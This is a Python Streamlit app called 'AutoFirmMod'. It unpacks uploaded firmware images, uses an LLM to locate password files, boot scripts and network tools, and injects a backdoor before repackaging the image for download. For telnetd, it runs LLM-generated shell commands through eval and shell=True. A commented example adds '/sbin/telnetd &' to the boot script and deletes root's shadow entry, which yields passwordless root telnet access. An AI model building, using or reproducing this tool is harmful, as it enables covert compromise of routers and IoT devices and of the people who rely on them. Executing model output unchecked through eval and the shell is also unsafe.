import streamlit as st
import os
import uuid
import subprocess
from dotenv import load_dotenv
from llm import get_llm_response
import json

load_dotenv()
UPLOAD_DIR = "upload"
os.makedirs(UPLOAD_DIR, exist_ok=True)


def save_uploaded_file(upload_file, user_id):
    user_dir = os.path.join(UPLOAD_DIR, user_id)
    os.makedirs(user_dir, exist_ok=True)

    save_path = os.path.join(user_dir, upload_file.name)
    with open(save_path, "wb") as f:
        f.write(upload_file.getbuffer())
    return save_path, user_dir


def run_binwalk(save_path, log_path):
    with open(log_path, "w") as log_file:
        subprocess.run(["binwalk", save_path], stdout=log_file, stderr=log_file)


def extract_squashfs(file_path, output_path, offset, size=None):
    command = [
        "dd",
        f"if={file_path}",
        f"of={output_path}",
        "bs=1",
        f"skip={offset}"
    ]
    if size is not None:
        command.append(f"count={size}")
    subprocess.run(command, check=True)


def extract_filesystem(squashfs_path, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    subprocess.run(["unsquashfs", "-f", "-d", output_dir, squashfs_path], check=True)
    return


def directory_clean(path):
    if os.path.exists(path):
        subprocess.run(["rm", "-rf", path], check=True)


def directory_tree(user_dir, save_dir):
    with open(save_dir, "w") as save_dir:
        subprocess.run(
            f"tree {user_dir}/rootfs| sed 's|{user_dir.replace("/", "\\/")}/||'",
            shell=True, stdout=save_dir, stderr=save_dir
        )


def button_click_callback(key):
    st.session_state.button_clicked = key


def read_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()        
    except FileNotFoundError:
        st.error("The specified file was not found.")
    except Exception as e:
        st.error(f"An error occurred: {e}") 
    return file_data


def overwrite_file(src_path, start_byte, end_byte, dst_path):
    try:
        if end_byte == None:
            end_byte = len(dst_path)
        overwrite_length_check = end_byte - start_byte
        with open(src_path, 'rb') as source_file:
            src_data = source_file.read()
        overwrite_length = len(src_data)
        if overwrite_length < overwrite_length_check:
            print('The size of the filesystem to be overwritten is larger than the existing filesystem.')
        length = min(overwrite_length, overwrite_length_check)
        with open(dst_path, 'rb+') as target_file:
            target_file.seek(start_byte)
            target_file.write(src_data[:length])

        print(f"Successfully overwritten {length} bytes from {src_path} "
              f"to {dst_path} from byte {start_byte} to {start_byte + length}.")
    except FileNotFoundError as e:
        print(f"File not found: {e.filename}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Streamlit Main
st.title("AutoFirmMod")
st.markdown("""
        <style>
        .button-container {
            display: flex;
            justify-content: center;
            width: 100%;
        }
        .stButton button {
            width: 100px; 
        }
        </style>
    """, unsafe_allow_html=True)

if "button_clicked" not in st.session_state:
    st.session_state.button_clicked = None

if "file_paths_json1" not in st.session_state:
    st.session_state.file_paths_json1 = None

if "file_paths_json2" not in st.session_state:
    st.session_state.file_paths_json2 = None

if "user_dir" not in st.session_state:
    st.session_state.user_dir = None

if "upload_file_name" not in st.session_state:
    st.session_state.upload_file_name = None

if "squashfs_lines" not in st.session_state:
    st.session_state.squashfs_lines = None

if st.session_state.button_clicked is None:
    upload_file = st.file_uploader("Please upload your firmware", type=["bin"])
    if upload_file is not None:
        st.session_state.upload_file_name = upload_file.name
        user_id = str(uuid.uuid4())
        directory_clean(f'{UPLOAD_DIR}/{user_id}')
        save_path, user_dir = save_uploaded_file(upload_file, user_id)
        st.session_state.user_dir = user_dir
        log_path = os.path.join(user_dir, "binwalk_log.txt")
        run_binwalk(save_path, log_path)
        
        st.success(f"File saved successfully : {upload_file.name}")
        st.success(f"Running Binwalk on uploaded file...")

        squashfs_lines = []
        with open(log_path, "r") as f:
            lines = f.readlines() 

            for i, line in enumerate(lines):
                if "squashfs" in line.lower():
                    current_line = line.strip().split()
                    squashfs_lines.append(current_line) 
                    if i + 1 < len(lines) and "squashfs" not in lines[i + 1].lower():
                        next_line = lines[i + 1].strip().split()
                        squashfs_lines.append(next_line)
        st.session_state.squashfs_lines = squashfs_lines
        cnt = 0
        if not squashfs_lines:
            st.info("squashfs Filesystem not found.")
        else: 
            for i in range(len(squashfs_lines)):
                if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
                    offset = int(squashfs_lines[i][0])
                    if not squashfs_lines[i+1]:
                        size = None
                    else:
                        size = int(squashfs_lines[i+1][0]) - int(squashfs_lines[i][0])
                    output_path = user_dir+f'/squashfs{cnt}.bin'
                    extract_squashfs(save_path, output_path, offset, size)  
                    cnt += 1

            os.makedirs(f'{user_dir}/rootfs', exist_ok=True) 
            extracted_filesystems = []
            for i in range(cnt):
                input_squashfs = f'{user_dir}/squashfs{i}.bin'
                output_dir = f'{user_dir}/rootfs/squashfs-root-{i}'
                extract_filesystem(input_squashfs, output_dir)
                extracted_filesystems.append(f"squashfs-root-{i}")
            st.success(f"Filesystem extraction completed : {', '.join(extracted_filesystems)}")

            directory_tree(f'{user_dir}', f'{user_dir}/tree')

            file_paths = get_llm_response(1, f'{user_dir}/tree')
            file_paths_json1 = json.loads(file_paths)
            #file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/config/passwd","shadow":"rootfs/squashfs-root-0/etc/config/shadow","boot_scripts":["rootfs/squashfs-root-0/etc/init.d/rc.local","rootfs/squashfs-root-0/etc/init.d/rcS"]}
            #file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/passwd", "shadow":"rootfs/squashfs-root-0/etc/shadow", "boot_script":"rootfs/squashfs-root-0/etc/init.d/rcS"}
            st.session_state.file_paths_json1 = file_paths_json1
            st.markdown("---")
            st.write("### boot script & passwd")
            st.write(file_paths_json1)
            st.markdown("---")
            file_paths = get_llm_response(2, f'{user_dir}/tree')
            file_paths_json2 = json.loads(file_paths)
            #file_paths_json2 = {"telnetd":"rootfs/squashfs-root-1/sbin/telnetd","nc":"rootfs/squashfs-root-1/bin/nc","socat":None,"busybox":None}
            #file_paths_json2 = {"telnetd":"rootfs/squashfs-root-0/sbin", "nc":"rootfs/squashfs-root-0/bin", "socat":None, "busybox":"rootfs/squashfs-root-0/bin"}
            st.session_state.file_paths_json2 = file_paths_json2
            st.write("### Backdoor Point List")
            
        
            st.write(file_paths_json2)
            st.markdown("---")

            st.write("### Select Backdoor Type")
            columns = st.columns(4) 
            for idx, (key, path) in enumerate(file_paths_json2.items()):
                with columns[idx]:
                    st.markdown('<div class="button-container">', unsafe_allow_html=True)
                    if path is None:
                        st.button(f"{key}", key=f"{key}_disabled", disabled=True, help="Not Available")
                    else:
                        st.button(
                            f"{key}", 
                            key=f"{key}_enabled", 
                            disabled=False, 
                            help="Available",
                            on_click=button_click_callback,
                            args=(key,) 
                        )
                    st.markdown('</div>', unsafe_allow_html=True)
                

if st.session_state.get("button_clicked"):
    st.markdown(f"### Backdoor Type : {st.session_state.button_clicked}")
    if st.session_state.button_clicked == "telnetd":
        setting_path = st.session_state.file_paths_json1
        binary_path = st.session_state.file_paths_json2
        user_dir = st.session_state.user_dir
        commands = get_llm_response(3, None, setting_path, binary_path, st.session_state.user_dir)
        print(commands)
        commands = eval(commands)
        #commands = [f"echo '/sbin/telnetd &' >> {user_dir}/rootfs/squashfs-root-0/etc/init.d/rcS", f"sed -i '/^root:/d' {user_dir}/rootfs/squashfs-root-0/etc/shadow"]
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=True)  
            except subprocess.CalledProcessError as e:
                st.info(f"Error occurred while executing the command: {cmd}")
        st.success(f'Filesystem modification complete!')
        cmd = f"find {user_dir}/rootfs/* -type d -mtime -1"
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        lines = result.stdout.splitlines()
        modified_fs = []
        for line in lines:
            word = line.split('/')
            modified_fs.append(word[3])
        st.success(f'Repackaging modified filesystem : {', '.join(modified_fs)}')
        for fs_path in modified_fs:
            cmd = ["mksquashfs", f"{user_dir}/rootfs/{fs_path}", f"{user_dir}/{fs_path}-patched", "-comp", "xz"]
            try:
                result = subprocess.run(cmd, check=True, capture_output=True, text=True)
                print("Command executed successfully:")
                print(result.stdout) 
            except subprocess.CalledProcessError as e:
                print("Command failed with error:")
                print(e.stderr)
        file_path_src = f"{user_dir}/{st.session_state.upload_file_name}"
        file_path_dst = f"{user_dir}/{st.session_state.upload_file_name.split('.')[0]}-modified.bin"
        subprocess.run(["cp", file_path_src, file_path_dst], check=True)
        squashfs_lines = st.session_state.squashfs_lines
        fs_size = {}
        for i in range(len(squashfs_lines)):
            if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
                start_byte = int(squashfs_lines[i][0])
                if not squashfs_lines[i+1]:
                    end_byte = None
                else:
                    end_byte = int(squashfs_lines[i+1][0])
                fs_size[f"squashfs-root-{i}"] = [start_byte, end_byte]

        for fs_path in modified_fs:
            src_path = f"{user_dir}/{fs_path}-patched"
            start_byte, end_byte = fs_size[f'squashfs-root-{fs_path[-1]}']
            overwrite_file(src_path, start_byte, end_byte, file_path_dst)
        file_name = file_path_dst.split("/")[-1] 
        file_data = read_file(file_path_dst)
        st.write("### Download Modified Firmware")
        st.write('Please click the download link below to download the modified firmware.')
        st.download_button(
                label=f"Download",
                data=file_data,
                file_name=file_name,
                mime="application/octet-stream",
        )
        
    elif st.session_state.button_clicked == "nc":
        st.code(f"file_paths_json1: {st.session_state.file_paths_json1}")
        st.code(f"file_paths_json2: {st.session_state.file_paths_json2}")
    elif st.session_state.button_clicked == "socat":
        st.code(f"file_paths_json1: {st.session_state.file_paths_json1}")
        st.code(f"file_paths_json2: {st.session_state.file_paths_json2}")
    elif st.session_state.button_clicked == "busybox":
        st.code(f"file_paths_json1: {st.session_state.file_paths_json1}")
        st.code(f"file_paths_json2: {st.session_state.file_paths_json2}")

